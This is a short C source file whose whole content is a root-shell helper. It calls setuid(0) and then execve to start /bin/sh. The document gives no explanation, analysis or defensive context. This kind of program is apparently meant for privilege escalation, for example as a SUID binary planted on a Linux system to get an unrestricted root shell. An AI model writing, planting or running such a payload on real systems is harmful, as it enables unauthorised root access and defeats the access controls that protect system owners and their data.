#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[])
{
    char *data[2];
    char *exe = "/bin/sh";

    data[0] = exe;
    data[1] = NULL;

    setuid(0);
    execve(data[0], data, NULL);
    return 0;
}
